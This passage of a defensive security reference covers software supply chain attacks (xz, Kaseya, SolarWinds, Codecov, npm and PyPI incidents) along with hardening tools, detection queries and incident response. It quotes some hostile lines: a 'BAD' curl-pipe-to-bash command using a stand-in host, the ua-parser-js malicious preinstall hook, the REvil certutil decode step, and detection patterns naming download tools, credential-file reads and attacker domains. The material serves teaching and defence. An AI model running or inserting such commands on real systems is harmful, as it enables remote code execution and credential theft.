| Named mutex | `3CXDesktopApp` |

#### 1.6.4 xz utils backdoor (CVE-2024-3094)

**Attack chain — multi-year social engineering:**

1. **2021-2022:** "Jia Tan" (pseudonym) began submitting legitimate patches to xz utils, building trust with maintainer Lasse Collin. Sockpuppet accounts pressured Collin to add a co-maintainer.
2. **2023-2024:** Jia Tan gained commit access and became a trusted co-maintainer.
3. **Feb 2024:** injected malicious test files (`bad-3-corrupt_lzma2.xz`, `good-large_compressed.lzma`) into the repository. These files contained the encrypted backdoor payload disguised as test fixtures.
4. **Build system injection:** modified `build-to-host.m4` (autotools macro) to extract and inject the backdoor payload during `make`. The payload was decoded from the test files using a series of `tr`, `head`, `tail`, and `xz` commands.
5. **Backdoor mechanism:**
   - Modified `liblzma.so` to hook `RSA_public_decrypt()` via IFUNC resolver (GNU indirect function)
   - Targeted OpenSSH's `sshd` (which links `libsystemd` → `liblzma` on systemd-based systems)
   - The hook intercepted SSH authentication and checked for a specific RSA public key in the client's certificate
   - If the key matched the attacker's, a command payload embedded in the certificate's CA signing key field was extracted and executed as root
6. **Evasion:** disabled Landlock sandbox detection to avoid triggering in test environments; detected Valgrind and altered behavior; obfuscated the build injection to avoid casual review.

**Discovery:** Andres Freund (PostgreSQL developer at Microsoft) noticed anomalous CPU consumption (~500ms latency) in SSH logins on a Debian Sid machine running the backdoored liblzma, traced it to the xz 5.6.0/5.6.1 builds.

**Affected versions:** xz 5.6.0 and 5.6.1. No stable distribution shipped these versions to production (caught before release in Debian Stable, Fedora Stable, Ubuntu LTS). Fedora Rawhide and Debian Sid were affected.

#### 1.6.5 Kaseya VSA / REvil (2021)

**Attack chain:**

1. **Vulnerability exploitation:** REvil (Sodinokibi) affiliates exploited zero-day vulnerabilities in Kaseya VSA on-premises servers:
   - CVE-2021-30116: credential leak and business logic flaw
   - CVE-2021-30119: XSS vulnerability
   - CVE-2021-30120: 2FA bypass
2. **Payload deployment:** exploited the VSA agent update mechanism to push a malicious update to all managed endpoints. The update:
   - Disabled Windows Defender via `reg add` commands
   - Dropped `agent.crt` (encrypted REvil payload) and `agent.exe` (legitimate Microsoft Defender binary for DLL sideloading)
   - Executed `certutil.exe -decode agent.crt agent.exe` to decode the payload
   - Deployed REvil ransomware
3. **Scale:** approximately 60 MSPs compromised, affecting ~1,500 downstream organizations. Ransom demand: $70 million for universal decryptor.

---

### 1.7 Repository and signing attacks

#### 1.7.1 RepoJacking

**Mechanism:** GitHub, GitLab, and other platforms allow username changes. When a user renames their account, the old namespace becomes available for registration. Dependencies that reference the old namespace via:
- Go module paths (`github.com/old-owner/module`)
- GitHub Actions (`uses: old-owner/action@v1`)
- Install scripts (`curl https://github.com/old-owner/repo/...`)
- Package manager source URLs

...will now resolve to whatever the new owner of that namespace serves.

**Enumeration:**

```bash
# Scan Go dependencies for RepoJacking risk
# Check if any dependency's GitHub owner has renamed
grep -oP 'github\.com/[^/]+' go.sum | sort -u | while read -r path; do
  owner=$(echo "$path" | cut -d'/' -f2)
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://github.com/$owner")
  if [ "$status" = "404" ]; then
    echo "VULNERABLE: $path (owner namespace available)"
  fi
done

# Scan GitHub Actions workflows for unpinned or renamed owners
grep -rn 'uses:' .github/workflows/ | grep -vP '@[a-f0-9]{40}'
```

**Hardening:**

```bash
# Pin GitHub Actions to full commit SHA
# uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1

# For Go: use GOPRIVATE and verify module checksums
go mod verify

# GitHub's namespace retirement protection covers some popular repos,
# but not all — do not rely on it exclusively
```

#### 1.7.2 Git commit signature spoofing

**Attack surface:**

- Default Git configuration accepts unsigned commits — most repositories have no signature requirement
- GitHub "Verified" badge matches the committer email against verified emails on the GitHub account — an attacker who controls a matching email address can produce commits that appear verified
- GPG key management failures: expired keys still show as "Verified" for commits made before expiration; revoked keys may not propagate to all verifiers
- SSH signing (Git 2.34+) is simpler but still requires the platform to maintain an allow-list of trusted public keys

**Hardening:**

```bash
# Require signed commits (branch protection — GitHub)
# Repository → Settings → Branches → Branch protection rules
#   ✓ Require signed commits

# Configure Git for SSH signing
git config --global gpg.format ssh
git config --global user.signingkey ~/.ssh/id_ed25519.pub
git config --global commit.gpgsign true
git config --global tag.gpgsign true

# Allowed signers file for verification
echo "user@example.com ssh-ed25519 AAAA..." > ~/.config/git/allowed_signers
git config --global gpg.ssh.allowedSignersFile ~/.config/git/allowed_signers

# Verify commit signatures
git log --show-signature -5
git verify-commit HEAD
```

---

## 2. Supply chain defense frameworks

### 2.1 SLSA (Supply-chain Levels for Software Artifacts)

SLSA (pronounced "salsa") is a graduated security framework that defines increasing levels of supply chain integrity guarantees.

| Level | Build | Source | Requirements |
|-------|-------|--------|-------------|
| **Level 1** | Documented | - | Build process exists and produces provenance (can be self-attested) |
| **Level 2** | Hosted | - | Build runs on a hosted build service; provenance is generated by the build service (not self-attested) |
| **Level 3** | Hardened | - | Build service is hardened: isolated, ephemeral build environments; provenance is non-forgeable by project maintainers |
| **Level 4** | Hermetic | Reviewed | Two-person review of all changes; hermetic, reproducible build; build environment is fully parameterized |

**Provenance attestation:** a signed JSON document (in-toto predicate format) describing:
- Builder identity (which build service produced the artifact)
- Source repository and commit
- Build command / entry point
- Input dependencies (with digests)
- Output artifact digest

```bash
# Generate SLSA provenance with slsa-verifier
# For GitHub Actions — use the official SLSA generator
# In .github/workflows/release.yml:

# Verify SLSA provenance of a downloaded artifact
slsa-verifier verify-artifact myapp-v1.0.0.tar.gz \
  --provenance-path myapp-v1.0.0.intoto.jsonl \
  --source-uri github.com/company/myapp \
  --source-tag v1.0.0

# Inspect provenance contents
cat myapp-v1.0.0.intoto.jsonl | jq -r '.payload' | base64 -d | jq .
```

### 2.2 Sigstore ecosystem

#### 2.2.1 cosign — container and artifact signing

```bash
# Generate a key pair
cosign generate-key-pair
# Produces cosign.key (private, encrypted) and cosign.pub (public)

# Sign a container image (key-based)
cosign sign --key cosign.key myregistry.com/myapp@sha256:abc123...

# Verify a container image (key-based)
cosign verify --key cosign.pub myregistry.com/myapp@sha256:abc123...

# Keyless signing (uses Fulcio + Rekor)
# Authenticates via OIDC (GitHub, Google, Microsoft)
cosign sign myregistry.com/myapp@sha256:abc123...
# Opens browser for OIDC authentication, obtains short-lived cert from Fulcio,
# records signature in Rekor transparency log

# Keyless verification
cosign verify \
  --certificate-identity user@example.com \
  --certificate-oidc-issuer https://accounts.google.com \
  myregistry.com/myapp@sha256:abc123...

# Sign a blob (binary, SBOM, etc.)
cosign sign-blob --key cosign.key --bundle myfile.bundle myfile.tar.gz

# Verify a blob
cosign verify-blob --key cosign.pub --bundle myfile.bundle myfile.tar.gz

# Attach an SBOM to an image
cosign attach sbom --sbom sbom.spdx.json myregistry.com/myapp@sha256:abc123...

# Verify SBOM attestation
cosign verify-attestation \
  --type spdxjson \
  --certificate-identity user@example.com \
  --certificate-oidc-issuer https://accounts.google.com \
  myregistry.com/myapp@sha256:abc123...
```

#### 2.2.2 Fulcio — ephemeral certificate authority

Fulcio issues short-lived X.509 code-signing certificates (validity: ~10 minutes) bound to an OIDC identity. The flow:

1. Signer authenticates via OIDC provider (GitHub Actions OIDC, Google, Microsoft)
2. Fulcio verifies the OIDC token and issues a certificate with the signer's identity in the SAN
3. The signer uses the ephemeral key to sign the artifact
4. The signature and certificate are recorded in Rekor before the certificate expires

No long-lived keys to manage, rotate, or protect. The trust anchor is the OIDC provider + the Rekor transparency log.

#### 2.2.3 Rekor — transparency log

An append-only Merkle tree (based on Trillian) that records all signing events. Properties:

- **Immutable:** entries cannot be modified or deleted after insertion
- **Auditable:** any party can verify the log's consistency (no entries silently added or removed)
- **Searchable:** query by artifact digest, signer identity, or entry UUID

```bash
# Search Rekor for entries related to an artifact
rekor-cli search --sha sha256:abc123...

# Get a specific entry
rekor-cli get --uuid <entry-uuid> --format json

# Verify the inclusion proof of an entry
rekor-cli verify --artifact myfile.tar.gz --signature myfile.sig --pki-format x509 --public-key cosign.pub
```

### 2.3 in-toto — supply chain layout verification

in-toto defines and verifies the steps in a software supply chain. Components:

- **Layout:** a JSON document signed by the project owner that defines the expected steps, who is authorized to perform each step, and what artifacts each step consumes and produces.
- **Step link:** a signed JSON document produced by each step, recording the materials (inputs), products (outputs), and command executed.
- **Threshold signing:** requiring multiple functionaries to perform a step (e.g., two reviewers must approve).

```bash
# Define a supply chain layout
in-toto-run --step-name clone --products . -- git clone https://github.com/company/myapp.git

in-toto-run --step-name build --materials myapp/ --products myapp/dist/ -- make build

in-toto-run --step-name test --materials myapp/ -- make test

in-toto-run --step-name package --materials myapp/dist/ --products myapp-v1.0.tar.gz -- tar czf myapp-v1.0.tar.gz -C myapp/dist .

# Verify the supply chain
in-toto-verify --layout layout.json --layout-keys owner-pub.pem

# The verification checks:
# 1. Every step defined in the layout has a corresponding link
# 2. Each link is signed by an authorized functionary
# 3. Artifact flow is consistent (step N's products match step N+1's materials)
# 4. Inspection commands (defined in layout) pass
```

**Layout file structure (simplified):**

```json
{
  "_type": "layout",
  "steps": [
    {
      "name": "clone",
      "expected_command": ["git", "clone", "..."],
      "threshold": 1,
      "pubkeys": ["functionary-key-id-1"],
      "expected_products": [["MATCH", "myapp/*", "WITH", "PRODUCTS", "FROM", "clone"]]
    },
    {
      "name": "build",
      "threshold": 1,
      "pubkeys": ["functionary-key-id-2"],
      "expected_materials": [["MATCH", "myapp/*", "WITH", "PRODUCTS", "FROM", "clone"]],
      "expected_products": [["CREATE", "myapp/dist/*"]]
    }
  ],
  "inspect": [
    {
      "name": "verify-signature",
      "run": ["gpg", "--verify", "myapp-v1.0.tar.gz.sig"]
    }
  ],
  "keys": { "functionary-key-id-1": { "...": "..." } }
}
```

### 2.4 SBOM (Software Bill of Materials)

#### 2.4.1 Format comparison

| Feature | SPDX | CycloneDX |
|---------|------|-----------|
| Standard body | Linux Foundation / ISO 5962 | OWASP |
| Primary focus | License compliance + security | Security + operational risk |
| Formats | JSON, RDF/XML, Tag-Value, YAML | JSON, XML, Protobuf |
| Dependency graph | Relationships between packages | Explicit dependency tree |
| VEX support | Via SPDX 2.3+ security namespace | Native VEX integration (CycloneDX 1.4+) |
| Service BOM | Limited | Full support (CycloneDX 1.2+) |
| Hardware BOM | Not supported | Supported (CycloneDX 1.5+) |
| NTIA minimum elements | Supported | Supported |

**NTIA minimum elements:** supplier name, component name, component version, unique identifier (PURL, CPE, or SWID), dependency relationships, author of SBOM data, timestamp.

#### 2.4.2 Generation tools

```bash
# Syft — generate SBOM from container image, filesystem, or archive
# Supports SPDX and CycloneDX output
syft packages myregistry.com/myapp:latest -o spdx-json > sbom.spdx.json
syft packages myregistry.com/myapp:latest -o cyclonedx-json > sbom.cdx.json
syft packages dir:./myapp -o cyclonedx-json > sbom.cdx.json

# cdxgen — CycloneDX generator for multiple ecosystems
cdxgen -t python -o sbom.cdx.json ./myapp
cdxgen -t node -o sbom.cdx.json ./myapp
cdxgen -t java -o sbom.cdx.json ./myapp

# spdx-sbom-generator — multi-language SPDX generator
spdx-sbom-generator -p ./myapp -o ./sbom/

# Microsoft SBOM Tool (sbom-tool)
sbom-tool generate -b ./build -bc ./myapp -pn myapp -pv 1.0.0 -ps "Company" -nsb https://company.com

# Trivy — SBOM generation + vulnerability scan in one pass
trivy image --format spdx-json --output sbom.spdx.json myregistry.com/myapp:latest
trivy sbom sbom.spdx.json  # Scan existing SBOM for vulnerabilities
```

#### 2.4.3 Vulnerability correlation

```bash
# Grype — scan SBOM for known vulnerabilities
grype sbom:sbom.cdx.json --fail-on critical
grype sbom:sbom.spdx.json -o json > vuln-report.json

# OSV-Scanner — scan against the OSV database (aggregates multiple sources)
osv-scanner --sbom sbom.cdx.json
osv-scanner --lockfile package-lock.json
osv-scanner --lockfile requirements.txt
osv-scanner --lockfile go.sum

# pip-audit — Python-specific vulnerability scanning
pip-audit --requirement requirements.txt --format json --output audit.json

# npm audit — Node.js vulnerability scanning with signature verification
npm audit --json
npm audit signatures  # Verify registry signatures on packages

# Trivy — vulnerability scan from SBOM
trivy sbom sbom.cdx.json --severity CRITICAL,HIGH --exit-code 1
```

### 2.5 Dependency pinning and lockfile integrity

#### 2.5.1 Lockfile integrity per ecosystem

| Ecosystem | Lockfile | Hash Algorithm | Verification Command |
|-----------|----------|----------------|---------------------|
| npm | `package-lock.json` | SHA-512 (integrity field) | `npm ci` (strict lockfile install) |
| yarn | `yarn.lock` | SHA-512 | `yarn install --frozen-lockfile` |
| pnpm | `pnpm-lock.yaml` | SHA-512 | `pnpm install --frozen-lockfile` |
| pip | `requirements.txt` | SHA-256 (with `--hash`) | `pip install --require-hashes -r requirements.txt` |
| Poetry | `poetry.lock` | SHA-256 | `poetry install --no-update` |
| Go | `go.sum` | SHA-256 (h1: prefix) | `go mod verify` |
| Cargo | `Cargo.lock` | SHA-256 (checksum field) | `cargo install --locked` |
| Bundler | `Gemfile.lock` | SHA-256 (checksums section, Bundler 2.4+) | `bundle install --frozen` |

#### 2.5.2 Hash verification examples

```bash
# pip — generate requirements with hashes
pip-compile --generate-hashes requirements.in > requirements.txt
# Result:
# requests==2.31.0 \
#     --hash=sha256:58cd2187c01e70e6e26505bca751777aa9f2ee0b7f4300988b709f44e013003e \
#     --hash=sha256:942c5a758f98d790eaed1a29cb6eefc7f0edf3fcb0fce8aea3fbd5951dbdf4b8

# Install with hash enforcement
pip install --require-hashes --no-deps -r requirements.txt

# npm — verify integrity of installed packages
npm ci  # Fails if package-lock.json doesn't match node_modules

# Go — verify module checksums against go.sum
go mod verify
# Expected output: "all modules verified"

# Cargo — build with locked dependencies
cargo build --locked
# Fails if Cargo.lock is missing or doesn't match Cargo.toml
```

#### 2.5.3 Vendoring strategies

```bash
# Go — vendor all dependencies
go mod vendor
# Commit vendor/ directory to source control
# Build with: go build -mod=vendor ./...

# Python — download and vendor wheels
pip download --dest vendor/ -r requirements.txt
# Install from local vendor directory
pip install --no-index --find-links=vendor/ -r requirements.txt

# npm — use npm pack to create local tarballs
npm pack <package-name>
# Reference in package.json:
# "dependencies": { "package-name": "file:./vendor/package-name-1.0.0.tgz" }

# Cargo — vendor crates
cargo vendor
# Creates .cargo/config.toml pointing to local vendor directory
```

---

## 3. Supply chain detection and monitoring

### 3.1 Behavioral analysis of packages

#### 3.1.1 Static analysis

```bash
# socket.dev — deep behavioral analysis of npm packages
npx @socketsecurity/cli report package-lock.json
# Flags: install scripts, network access, filesystem access, shell execution,
# obfuscated code, typosquat risk, maintenance status

# Packj — static + dynamic analysis of PyPI/npm/RubyGems packages
packj audit --pm pypi --pkg requests
packj audit --pm npm --pkg express
# Checks: author identity, repo activity, deprecated APIs, obfuscation,
# sensitive API usage (network, fs, process, crypto)

# npm — list packages with install scripts
npm query ':attr(scripts, [preinstall]), :attr(scripts, [postinstall]), :attr(scripts, [install])' 2>/dev/null
```

#### 3.1.2 Dynamic sandbox analysis

Execute `pip install` / `npm install` in an isolated sandbox and monitor:

- **Network connections** — unexpected outbound connections during install (DNS exfiltration, HTTP POST to unknown hosts)
- **File system access** — reading `~/.ssh/`, `~/.aws/`, `~/.npmrc`, `~/.gitconfig`, environment files
- **Process execution** — spawning shells, curl/wget, base64 encoding
- **Data exfiltration** — encoding and transmitting environment variables, credentials, source code

```bash
# Sandboxed install with strace monitoring
mkdir /tmp/sandbox && cd /tmp/sandbox
python3 -m venv .venv && source .venv/bin/activate
strace -f -e trace=network,openat -o /tmp/install-trace.log \
  pip install suspicious-package 2>&1
# Analyze trace for unexpected syscalls
grep -E 'connect|sendto|openat.*\.(ssh|aws|env|npmrc)' /tmp/install-trace.log
```

### 3.2 Build system monitoring

**Sigma rule — build artifact modification after signing:**

```yaml
title: Build Artifact Modified After Code Signing
id: b3c7d1e5-4f2a-8b6d-9e0c-5a3f1d7b2e8c
status: experimental
description: Detects file modifications to build artifacts after they have been signed, indicating potential tampering
logsource:
  product: windows
  category: file_change
detection:
  selection_signed:
    TargetFilename|endswith:
      - '.exe'
      - '.dll'
      - '.msi'
  selection_after_sign:
    # File modified AFTER signtool.exe was last invoked
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\python.exe'
    CommandLine|contains:
      - 'copy '
      - 'move '
      - 'rename '
      - 'Add-Content'
  condition: selection_signed and selection_after_sign
level: high
tags:
  - attack.defense_evasion
  - attack.t1195.002
```

**KQL — anomalous process in build environment:**

```kql
DeviceProcessEvents
| where DeviceName startswith "BUILD-"  // Adjust to build server naming convention
| where FileName in ("curl.exe", "wget.exe", "certutil.exe", "bitsadmin.exe", "powershell.exe")
| where ProcessCommandLine has_any ("http://", "https://", "-urlcache", "DownloadFile", "Invoke-WebRequest")
| where ProcessCommandLine !has_any ("nuget.org", "registry.npmjs.org", "pypi.org")  // Filter known-good
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by Timestamp desc
```

**SPL — CI/CD secret access anomalies:**

```spl
index=ci_audit sourcetype=github:audit action="secret.*"
| stats count by actor, action, repo, secret_name, _time
| eventstats avg(count) as avg_count, stdev(count) as stdev_count by actor
| where count > (avg_count + 2 * stdev_count)
| sort -count
```

### 3.3 Network IOC correlation for supply chain attacks

```kql
// Defender for Endpoint — detect package manager connecting to known-malicious infrastructure
let malicious_domains = dynamic([
    "attacker-c2.com",
    "exfil-server.net"
]);
DeviceNetworkEvents
| where InitiatingProcessFileName in ("npm", "node", "pip", "pip3", "python", "python3", "dotnet", "go", "cargo")
| where RemoteUrl has_any (malicious_domains)
  or RemoteIP in ("1.2.3.4", "5.6.7.8")  // Known attacker IPs
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort
```

```spl
// Splunk — correlate package install with threat intelligence
index=proxy sourcetype=squid
| search (src_process="npm" OR src_process="pip" OR src_process="node")
| lookup threat_intel_iocs domain AS dest_host OUTPUT threat_category, threat_score
| where isnotnull(threat_category)
| stats count by src_ip, dest_host, threat_category, threat_score, _time
```

---

## 4. Hardware supply chain

### 4.1 Counterfeit ICs

**Remarked**: legitimate ICs with markings changed to misrepresent the part number, speed grade, temperature rating, or manufacturer. An industrial-grade part remarked as military-grade may fail in extreme environments. **Recycled**: ICs recovered from e-waste and resold as new. Degraded reliability due to thermal cycling, electromigration, and oxide wear. **Cloned**: reverse-engineered and manufactured by an unauthorized party, potentially with different (inferior or backdoored) silicon. **Overproduced**: foundry produces more dies than contracted and sells the excess without the design owner's knowledge.

**Detection methods:**

| Method | Principle | Reliability |
|--------|-----------|-------------|
| Visual inspection | Package markings, surface finish, lead condition | Low (easily faked) |
| X-ray imaging | Die size, bond wire pattern, die attach | Medium |
| SAM (Scanning Acoustic Microscopy) | Internal delamination, voids | Medium |
| Electrical testing | Parametric testing against datasheet specs | Medium-High |
| IDDQ testing | Quiescent current measurement (defective ICs draw more) | Medium-High |
| PUF challenge-response | Compare against enrolled golden response | High |
| Decapsulation + SEM | Direct die imaging, gate-level comparison | Very High (destructive) |

**PUF (Physical Unclonable Function)**: a hardware fingerprint derived from manufacturing variations (delay differences in logic paths, SRAM power-up state, ring-oscillator frequency variation). PUFs provide a unique per-chip identity that cannot be cloned or predicted, used for IC authentication (the buyer challenges the IC with an input; the PUF response is verified against a database of known-good responses). PUF types: arbiter PUF, ring-oscillator PUF, SRAM PUF (most practical for commercial deployment — requires no additional circuitry beyond existing SRAM).

### 4.2 Hardware Trojans

Malicious modifications to an IC design, inserted during the design, fabrication, or packaging phases:

**Combinational Trojans**: activated by a specific combination of input signals (a rare signal pattern that occurs only under attacker-triggered conditions). **Sequential Trojans**: activated after a sequence of events or a specific number of clock cycles (a time bomb). **Analog Trojans**: modify analog characteristics (power consumption, EM emissions) to create a side channel for data exfiltration, or degrade reliability over time.

The Trojan trigger can be a specific JTAG command sequence, a magic packet on the I2C/SPI bus, or an internal counter reaching a threshold. The payload can be: data leakage (copying key material to an accessible register), denial of service (shutting down the chip), or privilege escalation (bypassing access controls).

**Detection taxonomy:**

| Phase | Method | Detail |
|-------|--------|--------|
| Pre-silicon | Formal verification | Model-check RTL against specification; detects logic added beyond spec |
| Pre-silicon | Code review | Manual inspection of third-party IP (hard IP cores are opaque) |
| Pre-silicon | Information flow tracking | Taint analysis at RTL level to detect unauthorized data flows |
| Post-silicon | Side-channel fingerprinting | Power/EM profile comparison against golden model |
| Post-silicon | IDDQ testing | Trojans add transistors, increasing quiescent current |
| Post-silicon | Path delay analysis | Trojans alter timing characteristics measurably |
| Post-silicon | Functional testing | Trigger-pattern coverage (limited by trigger rarity) |
| Post-silicon | Reverse engineering | Destructive; SEM imaging of delayered die, gate-level netlist extraction |

### 4.3 PCB and firmware implants

Physical implants inserted during manufacturing, shipping, or maintenance:

**Interposer boards**: a small PCB inserted between a chip and its socket (or between the PCB and a connector), adding functionality (keylogging, data exfiltration, remote access) that is invisible at the component level. USB keylogger interposers (placed between the keyboard's USB connector and the host) capture all keystrokes.

**Firmware implants**: modifying the firmware of a device's BMC (Baseboard Management Controller), NIC, or storage controller to add a persistent backdoor. The BMC has full access to the server's memory and network via IPMI/Redfish, making it a high-value target. NIC firmware (e.g., Broadcom, Intel) can be modified to intercept or inject network traffic below the OS level.

**NSA ANT catalog** (leaked 2013): documented hardware implant capabilities:

| Codename | Target | Capability |
|----------|--------|------------|
| COTTONMOUTH | USB | USB implant providing RF-based wireless C2 |
| HOWLERMONKEY | Generic | RF transceiver for short-range wireless data exfiltration |
| IRONCHEF | BIOS/firmware | Persistent BIOS implant with two-way HTTP(S) C2 |
| DEITYBOUNCE | Dell servers | Dell PowerEdge BIOS implant via BIOS reflash |
| JETPLOW | Cisco firewalls | Cisco PIX/ASA firmware implant, persists across reboots |
| HEADWATER | Huawei routers | Persistent backdoor in Huawei router firmware |
| FEEDTROUGH | Juniper | Juniper Netscreen firewall firmware persistence implant |
| DROPOUTJEEP | iPhone | Full device compromise: SMS, contact list, voicemail, geolocation, camera, microphone |

These represent state-level interdiction capabilities: intercepting hardware shipments and implanting devices before delivery to the target.

### 4.4 Open-source hardware verification

**OpenTitan**: an open-source silicon root of trust (RoT) project (led by Google/lowRISC). OpenTitan provides a transparent, auditable RoT design (RTL source code, verification tests, and design documentation are public). The goal: any party can inspect the RoT design for Trojans, backdoors, or vulnerabilities — addressing the "trust the silicon vendor" problem.

**Key components:**
- Open-source RISC-V core (Ibex)
- Cryptographic accelerators (AES, SHA-256/384/512, HMAC, KMAC, RSA, ECDSA)
- Secure boot and measured boot
- Physical attack countermeasures (glitch detectors, side-channel hardening)
- Key management with lifecycle support

The open-source model does not eliminate hardware Trojans but makes detection feasible through community audit, reproducible builds of GDS (GDSII layout) from RTL, and formal verification of the design.

---

## 5. Incident response — supply chain compromise playbook

### 5.1 Immediate containment (0-4 hours)

1. **Isolate build infrastructure** — take build servers, CI runners, and artifact repositories offline. Do not wipe — preserve for forensics.
2. **Revoke all secrets** — rotate every credential, token, API key, and signing key that was accessible in the build environment. Assume they are all compromised.
3. **Halt deployments** — stop all pipelines and deployment automations. No new artifacts reach production until cleared.
4. **Notify stakeholders** — internal security team, legal, affected partners/customers (per regulatory requirements).

### 5.2 Scoping (4-48 hours)

1. **Determine compromise window** — from first malicious commit/build to detection. All artifacts produced in this window are suspect.
2. **Enumerate affected artifacts** — every binary, container image, package, and update distributed during the window.
3. **Map downstream consumers** — who received the tainted artifacts? Direct customers, transitive dependencies, mirror/CDN caches.
4. **Collect forensic evidence** — build logs, pipeline execution history, git history, package registry audit logs, network flow data from build servers.

### 5.3 Analysis and eradication (48 hours - 2 weeks)

1. **Root cause analysis** — how did the attacker gain access? Compromised credentials, vulnerable CI config, social engineering of maintainer?
2. **Malware analysis** — reverse-engineer the injected payload. Document capabilities, C2 infrastructure, persistence mechanisms.
3. **IOC extraction** — file hashes, domains, IPs, behavioral indicators. Share with ISAC/CERT.
4. **Clean rebuild** — provision new build infrastructure from scratch. Do not reuse compromised machines. Rebuild all artifacts from verified source.

### 5.4 Recovery and hardening

1. **Distribute clean artifacts** — push patched versions through the same distribution channels. Clearly communicate the compromise and remediation steps to consumers.
2. **Implement SLSA Level 3+** — isolated, ephemeral build environments with non-forgeable provenance.
3. **Deploy SBOM generation** — attach SBOMs to all release artifacts for future vulnerability correlation.
4. **Enable Sigstore signing** — keyless signing with Rekor transparency log for all published artifacts.
5. **Lock dependency resolution** — enforce Package Source Mapping, hash verification, and lockfile integrity checks.
6. **Establish monitoring** — behavioral analysis on package installs, anomaly detection on build system network traffic, CI/CD audit log alerting.

---

## 6. Supply chain attack case studies — comparative forensic analysis

This section provides a cross-cutting forensic comparison of major supply chain incidents. Individual attack-chain details appear in §1.6 (this file) and Chapter 19B §1–§2. The focus here is comparative: attack patterns, detection gaps, time-to-detection, and transferable lessons.

### 6.1 SolarWinds SUNBURST — build process compromise

**Timeline and detection gap.** The SUNBURST backdoor was inserted into the SolarWinds Orion build pipeline in October 2019. Trojanized updates shipped from March to June 2020. FireEye disclosed the compromise on 2020-12-13 — a detection gap of approximately 14 months from first build injection. The initial discovery was not through supply chain monitoring but through the attackers pivoting into FireEye's own red-team toolset, triggering an anomalous access alert.

**Detection failure chain:**
1. No reproducible build verification — the Orion build output was not compared against independently rebuilt artifacts.
2. No source-to-binary integrity check — SUNSPOT restored the original `InventoryManager.cs` after compilation, so source code review showed no anomaly.
3. Code signing was applied to the backdoored DLL — the legitimate SolarWinds Authenticode certificate validated the tainted artifact, and downstream consumers trusted it.
4. The 12-14 day dormancy and environment fingerprinting evaded sandbox-based detonation.

**Blast radius.** ~18,000 organizations installed the backdoored update. ~100 were selected for second-stage exploitation (APT29 targeted USG agencies, critical infrastructure, and cybersecurity firms). The incident triggered Executive Order 14028 (May 2021) mandating SBOM for federal software procurement.

### 6.2 Codecov bash uploader — CI/CD secret exfiltration

**Timeline and detection gap.** The attacker modified the Codecov Bash Uploader on 2021-01-31. Detection occurred on 2021-04-01 (~60 days). A customer's security team noticed anomalous outbound connections from their CI runners to an IP not associated with Codecov infrastructure.

**Why detection took 60 days:**
1. The malicious `curl` command ran silently alongside the legitimate uploader functionality — it did not break CI pipelines or tests.
2. The exfiltration target IP was a generic cloud VPS; no threat-intelligence feed flagged it until after disclosure.
3. Organizations using `curl -s https://codecov.io/bash | bash` had no integrity verification — no checksum, no signature, no pinning.
4. CI environment variables (AWS keys, GitHub tokens, NPM tokens) are typically long-lived and not monitored for anomalous use from unexpected sources.

**Transferable pattern.** Any CI/CD tooling that instructs users to pipe a remote script into a shell (`curl | bash`, `wget -O- | sh`) creates a single point of failure — the remote server. Integrity verification must occur client-side via checksum pinning or cryptographic signature verification:

```bash
# BAD — no integrity verification
curl -s https://vendor.example/install.sh | bash

# BETTER — verify checksum before execution
curl -sLO https://vendor.example/install.sh
echo "a1b2c3d4...expected_sha256...  install.sh" | sha256sum -c -
bash install.sh

# BEST — verify detached GPG or cosign signature
curl -sLO https://vendor.example/install.sh
curl -sLO https://vendor.example/install.sh.sig
cosign verify-blob --key vendor-key.pub --signature install.sh.sig install.sh
bash install.sh
```

### 6.3 npm package compromise and sabotage patterns

Three distinct attack patterns emerged in the npm ecosystem in 2021-2022, each exploiting different trust assumptions.

#### 6.3.1 ua-parser-js account compromise (Oct 2021)

`ua-parser-js` is downloaded ~8 million times per week. On 2021-10-22, the maintainer's npm account was compromised (credential reuse, no 2FA). The attacker published versions 0.7.29, 0.8.0, and 1.0.0 containing a cryptocurrency miner and credential stealer targeting Linux and Windows. The malicious versions were live for approximately 4 hours before npm unpublished them. In that window, any CI/CD pipeline running `npm install` with a compatible semver range pulled the trojanized package.

**Payload indicators:**

```bash
# Linux payload: /tmp/.node cryptocurrency miner + preinstall.sh stealer
# Windows payload: sdd.dll (Danabot credential stealer)
# Malicious preinstall script:
preinstall: node -e "try{require('./preinstall')}catch(e){}"
```

**Detection signal.** New process execution from `node_modules/.cache` or `/tmp/.node` during npm install. File creation of unexpected executables in temporary directories by `npm` child processes.

#### 6.3.2 colors.js and faker.js sabotage (Jan 2022)

The maintainer Marak Squires deliberately sabotaged his own packages. `colors.js` v1.4.1 (released 2022-01-07) introduced an infinite loop printing `LIBERTY LIBERTY LIBERTY` followed by garbage characters via `zalgo` text generation. `faker.js` v6.6.6 contained only `module.exports = {};` — replacing the entire library with an empty export.

This was not a compromise but a protest against corporate free-riding on open-source labor. The incident affected thousands of downstream packages including `aws-cdk`, `@angular-devkit/core`, and numerous internal enterprise applications. Recovery required pinning to the last known-good version (colors@1.4.0) or migrating to community forks.

**Detection signal.** Infinite loop detection in CI/CD (process timeout/OOM), empty module exports where non-trivial exports were expected. These are behavioral anomalies detectable by runtime monitoring of package install and import behavior.

**Systemic lesson.** Lockfile enforcement (`npm ci` instead of `npm install` in CI) would have prevented automatic adoption of the sabotaged version. The incident demonstrated that the bus factor of critical infrastructure packages can be 1, and that the threat model must include maintainer hostility — not only external compromise.

#### 6.3.3 coa and rc account compromises (Nov 2021)

Within weeks of ua-parser-js, the `coa` (command-option-argument parser, ~9 million weekly downloads) and `rc` (runtime configuration loader, ~14 million weekly downloads) packages were compromised via maintainer account takeover. The injected code downloaded and executed a platform-specific binary from an external C2 server. The attack was detected within hours because the injected code broke the packages' TypeScript type definitions, causing build failures across the npm ecosystem — an inadvertent canary.

### 6.4 PyPI malware campaigns — typosquatting and dependency confusion at scale

PyPI's flat namespace and lack of mandatory 2FA (until mid-2023) made it the most targeted ecosystem for large-scale typosquatting. Between 2022 and 2024, security researchers documented multiple coordinated campaigns.

**Key campaigns:**

| Campaign | Date | Scale | Technique | Payload |
|----------|------|-------|-----------|---------|
| W4SP Stealer | 2022-Q3 | ~30 malicious packages | Typosquatting + StarJacking | Discord/browser credential theft |
